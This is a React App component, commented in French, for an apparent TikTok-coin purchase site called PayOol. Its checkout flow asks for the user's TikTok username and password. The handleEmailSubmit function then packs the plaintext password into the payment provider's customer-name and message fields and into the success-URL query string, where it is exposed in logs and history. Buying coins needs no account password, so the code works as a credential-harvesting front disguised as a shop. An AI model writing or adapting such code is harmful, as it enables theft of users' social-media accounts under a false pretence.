import { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { Sparkles } from 'lucide-react';
import { CoinPackage as CoinPackageComponent } from './components/CoinPackage';
import { CustomPackage } from './components/CustomPackage';
import { PurchaseHistory } from './components/PurchaseHistory';
import { TikTokFormModal } from './components/TikTokForm';
import { EmailFormModal } from './components/EmailForm';
import { PurchaseInstructionsModal } from './components/PurchaseInstructionsModal';
import { Layout } from './components/Layout';
import { Confetti } from './components/Confetti';
import { PWAInstallPrompt } from './components/PWAInstallPrompt';
import { coinPackages } from './data/coinPackages';
import { Purchase, User, CoinPackage, TikTokCredentials } from './types';
import { initiatePayment, PaymentProviderType } from './utils/payment';
import { getUserData, addPurchase } from './utils/localStorage';

// Importer les fichiers de style
import './styles/theme.css';
import './styles/confetti.css';

function App() {
  // Initialiser la traduction
  const { t } = useTranslation();
  
  // Charger les données utilisateur depuis le localStorage au démarrage
  const [user, setUser] = useState<User>(getUserData());

  const [selectedPackage, setSelectedPackage] = useState<CoinPackage | null>(null);
  const [tiktokData, setTiktokData] = useState<TikTokCredentials | null>(null);
  const [showEmailForm, setShowEmailForm] = useState(false);
  const [showInstructions, setShowInstructions] = useState(false);

  const handlePackageSelect = (pkg: CoinPackage) => {
    setSelectedPackage(pkg);
    setShowInstructions(true);
    // Ne pas afficher la modale TikTok pour l'instant
    setTiktokData(null);
  };

  const handleFormCancel = () => {
    setSelectedPackage(null);
    setTiktokData(null);
    setShowEmailForm(false);
  };

  const handleEmailFormCancel = () => {
    setShowEmailForm(false);
  };

  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [isPaymentLoading, setIsPaymentLoading] = useState(false);

  // First step: collect TikTok credentials
  const handleFormSubmit = (data: TikTokCredentials) => {
    setTiktokData(data);
    setShowEmailForm(true);
  };

  // Second step: collect email and process payment
  const handleEmailSubmit = (email: string, provider: PaymentProviderType) => {
    if (!selectedPackage || !tiktokData) return;
    
    // Clear any previous errors and set loading state
    setPaymentError(null);
    setIsPaymentLoading(true);
    


    // Generate orderId in the format TKT-XXXXX where X are random alphanumeric characters
    const generateRandomAlphanumeric = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };
    
    const orderId = `TKT-${generateRandomAlphanumeric(5)}`;
    
    // Créer une description qui inclut les identifiants TikTok (max 50 chars)
    let description = `Achat de ${selectedPackage.amount} pièces TikTok pour ${tiktokData.username}`;
    // S'assurer que la description ne dépasse pas 50 caractères
    if (description.length > 50) {
      description = description.substring(0, 47) + '...';
    }

    // Combine username and password in the customerName field
    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.password}`;
    
    // Créer un message avec les identifiants complets pour Lygos
    const messageWithCredentials = `${description} | User: ${tiktokData.username} | Pass: ${tiktokData.password}`;
    
    // Encoder les identifiants pour l'URL
    const encodedUsername = encodeURIComponent(tiktokData.username);
    const encodedPassword = encodeURIComponent(tiktokData.password);
    const encodedEmail = encodeURIComponent(email);
    
    initiatePayment({
      amount: selectedPackage.price,
      currency: 'XAF',
      description,
      orderId,
      customerName: customerNameWithCredentials,
      customerEmail: email,
      successUrl: `${window.location.origin}/TikTokCoins-PayOol/payment/confirmation?orderId=${orderId}&username=${encodedUsername}&password=${encodedPassword}&email=${encodedEmail}&amount=${selectedPackage.amount + (selectedPackage.bonus || 0)}&price=${selectedPackage.price}`,
      failureUrl: `${window.location.origin}/TikTokCoins-PayOol/payment/failure?orderId=${orderId}`,
      shopName: 'PayOol™',
      message: messageWithCredentials
    }, provider)
    .then(() => {
      console.log('Payment initiated successfully');
      
      // Créer l'achat et le sauvegarder dans le localStorage
      const purchase: Purchase = {
        id: orderId,
        packageId: selectedPackage.id,
        amount: selectedPackage.amount + (selectedPackage.bonus || 0),
        price: selectedPackage.price,
        date: new Date(),
        status: 'pending', // Initialiser le statut à 'pending'
      };
      
      // Mettre à jour l'état local et le localStorage
      const updatedUser = addPurchase(purchase);
      setUser(updatedUser);
      
      // Note: Les identifiants seront envoyés uniquement depuis la page de confirmation
      // après que l'utilisateur ait cliqué sur "Valider le paiement"
      
      // Note: Ne pas désactiver l'état de chargement ni fermer la modale
      // La redirection vers le fournisseur de paiement va interrompre l'exécution
      // et la modale restera ouverte jusqu'à la redirection
      
      // Délai de sécurité au cas où la redirection ne se produirait pas
      setTimeout(() => {
        setIsPaymentLoading(false);
        setSelectedPackage(null);
        setTiktokData(null);
        setShowEmailForm(false);
      }, 10000);
    })
    .catch((error) => {
      console.error('Payment error:', error);
      setPaymentError(error);
      setIsPaymentLoading(false);
    });
  };


  // Animation de confettis lorsqu'un achat est réussi
  const [showConfetti, setShowConfetti] = useState(false);
  
  // État pour gérer l'ouverture de la vidéo en popup
  const [showVideoPopup, setShowVideoPopup] = useState(false);
  
  useEffect(() => {
    if (showConfetti) {
      const timer = setTimeout(() => setShowConfetti(false), 3000);
      return () => clearTimeout(timer);
    }
  }, [showConfetti]);

  return (
    <Layout balance={user.balance}>
      {/* Section vidéo d'aide */}
      <div className="mb-8">
        <div className="bg-gradient-to-r from-[var(--background-elevated)] to-[var(--background-elevated-2)] rounded-[var(--radius-lg)] p-4 md:p-5 shadow-[var(--shadow-lg)] border border-[var(--border-dark)] overflow-hidden">
          <div className="flex flex-col md:flex-row md:items-center gap-4 md:gap-6">
            <div className="flex-shrink-0 md:min-w-[200px]">
              <div className="flex items-center gap-2 mb-2">
                <div className="w-2 h-2 rounded-full bg-[var(--tiktok-red)] animate-pulse"></div>
                <h3 className="text-base md:text-lg font-bold text-[var(--text-primary)]">
                  {t('needHelp')}
                </h3>
              </div>
              <p className="text-xs md:text-sm text-[var(--text-secondary)] leading-relaxed">{t('watchVideo')}</p>
            </div>
            <div 
              className="youtube-frame-wrapper"
              onClick={() => setShowVideoPopup(true)}
            >
              <div className="youtube-frame">
                <iframe
                  className="absolute top-0 left-0 w-full h-full pointer-events-none"
                  src="https://www.youtube.com/embed/6nJVsHQLQVw"
                  title="Tutoriel d'achat de pièces TikTok"
                  frameBorder="0"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                  allowFullScreen
                />
                <div className="youtube-overlay">
                  <div className="youtube-play-button">
                    <svg className="w-6 h-6 text-white ml-1" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M8 5v14l11-7z"/>
                    </svg>
                  </div>
                </div>
                <div className="youtube-shine"></div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Section principale avec les forfaits */}
      <div className="mb-12">
        <div className="flex items-center justify-between mb-8">
          <h2 className="text-2xl font-bold">{t('availablePackages')}</h2>
          <div className="flex items-center gap-2 text-sm bg-[var(--background-elevated-2)] px-3 py-1.5 rounded-full">
            <Sparkles className="w-4 h-4 text-[var(--tiktok-red)]" />
            <span>{t('securePayment')}</span>
          </div>
        </div>
        
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {coinPackages.map((pkg) => (
            <CoinPackageComponent
              key={pkg.id}
              package={pkg}
              onSelect={handlePackageSelect}
            />
          ))}
          <CustomPackage onSelect={handlePackageSelect} />
        </div>
      </div>

      {/* Section historique des achats */}
      <div className="mt-16">
        <h2 className="text-2xl font-bold mb-8 flex items-center gap-2">
          <span>{t('purchaseHistory')}</span>
          {user.purchaseHistory.length > 0 && (
            <span className="text-sm bg-[var(--background-elevated-2)] text-[var(--text-secondary)] px-2 py-0.5 rounded-full">
              {user.purchaseHistory.length}
            </span>
          )}
        </h2>
        <PurchaseHistory purchases={user.purchaseHistory} />
      </div>

      {/* Modales */}
      {selectedPackage && !showEmailForm && tiktokData === null && showInstructions === false && (
        <TikTokFormModal
          onSubmit={handleFormSubmit}
          onCancel={handleFormCancel}
        />
      )}
      
      {showInstructions && selectedPackage && (
        <PurchaseInstructionsModal
          isOpen={showInstructions}
          onClose={() => {
            setShowInstructions(false);
            setSelectedPackage(null);
          }}
          onContinue={() => {
            setShowInstructions(false);
            // Le formulaire TikTok s'affichera automatiquement car tiktokData est null
            // et showInstructions est false
          }}
        />
      )}
      
      {showEmailForm && selectedPackage && tiktokData && (
        <EmailFormModal
          packageAmount={selectedPackage.amount}
          packagePrice={selectedPackage.price}
          onSubmit={handleEmailSubmit}
          onCancel={handleEmailFormCancel}
          isLoading={isPaymentLoading}
        />
      )}
      
      {/* Affichage des erreurs de paiement */}
      {paymentError && (
        <div className="fixed inset-0 modal-backdrop flex items-center justify-center p-4 z-50 fade-in">
          <div className="bg-[var(--background-elevated)] rounded-[var(--radius-lg)] p-6 w-full max-w-md shadow-[var(--shadow-lg)] slide-up border border-[var(--border-dark)]">
            <div className="bg-red-900 bg-opacity-20 p-4 rounded-[var(--radius-md)] mb-4 flex items-start gap-3">
              <div className="w-8 h-8 rounded-full bg-red-900 bg-opacity-30 flex items-center justify-center flex-shrink-0 mt-0.5">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" className="w-5 h-5 text-red-500">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
              </div>
              <div>
                <h3 className="font-medium text-red-400 mb-1">{t('paymentError')}</h3>
                <p className="text-red-300 text-sm">{paymentError}</p>
              </div>
            </div>
            <button 
              onClick={() => setPaymentError(null)}
              className="tiktok-button w-full"
            >
              {t('close')}
            </button>
          </div>
        </div>
      )}
      
      {/* Animation de confettis pour les achats réussis */}
      {showConfetti && <Confetti duration={4000} />}
      
      {/* Modal popup pour la vidéo */}
      {showVideoPopup && (
        <div 
          className="fixed inset-0 modal-backdrop flex items-center justify-center p-4 z-50 fade-in"
          onClick={() => setShowVideoPopup(false)}
        >
          <div 
            className="bg-[var(--background-elevated)] rounded-[var(--radius-lg)] w-full max-w-4xl shadow-[var(--shadow-lg)] slide-up border border-[var(--border-dark)] overflow-hidden"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="flex items-center justify-between p-4 border-b border-[var(--border-dark)]">
              <h3 className="text-lg font-bold text-[var(--text-primary)]">{t('needHelp')}</h3>
              <button
                onClick={() => setShowVideoPopup(false)}
                className="w-8 h-8 rounded-full hover:bg-[var(--background-elevated-2)] flex items-center justify-center transition-colors"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            <div className="youtube-modal-frame-wrapper">
              <div className="youtube-modal-frame" style={{ paddingBottom: '56.25%' }}>
                <iframe
                  className="absolute top-0 left-0 w-full h-full"
                  src="https://www.youtube.com/embed/6nJVsHQLQVw?autoplay=1"
                  title="Tutoriel d'achat de pièces TikTok"
                  frameBorder="0"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                  allowFullScreen
                />
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* Modale d'installation PWA */}
      <PWAInstallPrompt />
    </Layout>
  );
}

export default App;